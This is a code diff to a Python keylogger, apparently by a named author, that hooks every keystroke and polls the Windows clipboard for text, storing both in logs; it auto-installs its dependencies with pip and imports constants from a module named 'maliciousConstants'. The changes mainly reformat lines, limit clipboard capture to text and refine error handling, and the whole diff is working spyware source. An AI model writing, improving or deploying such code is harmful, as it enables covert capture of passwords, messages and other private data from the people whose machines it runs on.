@@ -2,22 +2,23 @@
 Edan Jacobson
 Keylogger that logs clipboard and keyboard
 """
-from datetime import datetime
 import subprocess
 import sys
 
 try:
-    subprocess.run([sys.executable, "-m", "pip", "install", "pywin32"], check=True)
-    subprocess.run([sys.executable, "-m", "pip", "install", "keyboard"], check=True)
+    subprocess.run([sys.executable, "-m", "pip", "install", "pywin32"],
+                   check=True)
+    subprocess.run([sys.executable, "-m", "pip", "install", "keyboard"],
+                   check=True)
 
     import win32clipboard
 except ModuleNotFoundError as err:
-    print(f"Module not found: {err}" )
-import keyboard  
+    print(f"Module not found: {err}")
+import keyboard
 import time
 import threading
-from maliciousConstants import SLEEP, BACKSPACE, NEW_LINE, TAB, SPACE, REMOVE_FIRST
-
+from maliciousConstants import BACKSPACE, NEW_LINE, TAB, SPACE, \
+    REMOVE_FIRST
 
 
 class Keylogger:
@@ -27,18 +28,23 @@ class Keylogger:
         Method that creates keylogger object
         """
         date_time = time.ctime(time.time())
-        self.logged_data = [f'[START OF KEY LOGS]\n  *~ Date/Time: {date_time}\n']
-        self.copied_data = [f'[START OF CLIPBOARD LOGS]\n  *~ Date/Time: {date_time}\n']
+        self.logged_data = [
+            f'[START OF KEY LOGS]\n  *~ Date/Time: {date_time}\n']
+        self.copied_data = [
+            f'[START OF CLIPBOARD LOGS]\n  *~ Date/Time: {date_time}\n']
         # Start a thread to track the clipboard
         self.clip_thread = threading.Thread(target=self.clipboard_tracker)
         self.clip_thread.start()
         # Start a thread to track the keyboard
         self.key_thread = keyboard.hook(self.keyboard_tracker)
 
+    import win32clipboard
+    import time
+
     def clipboard_tracker(self):
         """
-        Method that tracks all changes and values stored in
-        clipboard and adds it to a file that stores all clipboard values
+        Method that tracks changes in clipboard and adds only text data
+        to a file that stores all clipboard values
         """
         # Initialize the clipboard text
         txt = ""
@@ -46,18 +52,32 @@ class Keylogger:
             try:
                 # Open the clipboard
                 win32clipboard.OpenClipboard()
-                # Get the copied data from the clipboard
-                copied = win32clipboard.GetClipboardData()
+                # Check if the clipboard contains text data
+                if win32clipboard.IsClipboardFormatAvailable(
+                        win32clipboard.CF_UNICODETEXT):
+                    # Get the copied text data from the clipboard
+                    copied = win32clipboard.GetClipboardData(
+                        win32clipboard.CF_UNICODETEXT)
+                    # If the copied text data is different from the previous clipboard text
+                    if copied != txt:
+                        self.copied_data.append(copied)
+                        txt = copied
                 # Close the clipboard
                 win32clipboard.CloseClipboard()
-                # If the copied data is different from the previous clipboard text
-                if copied != txt:
-                    self.copied_data.append(copied)
-                    txt = copied
                 # Wait for 0.5 seconds
-                time.sleep(SLEEP)
-            except Exception as err:
-                print("Error with clipboard" + str(err))
+                time.sleep(0.5)
+            except win32clipboard.error as err:
+                # Handle clipboard errors
+                if err.winerror == 0:
+                    print("Error: Unable to retrieve clipboard data.")
+                elif err.winerror == 1418:
+                    # The clipboard is empty or contains non-text data
+                    pass  # No action required
+                else:
+                    print(f"Error with clipboard: {err}")
+            except Exception as e:
+                # Handle other exceptions
+                print(f"Unexpected error: {e}")
 
     def keyboard_tracker(self, event):
         key = event.name
@@ -89,7 +109,6 @@ class Keylogger:
                 else:
                     # Write the key to the file, removing the single quotes
                     self.logged_data.append(key)
-
 
     def remove_copied(self):
         """
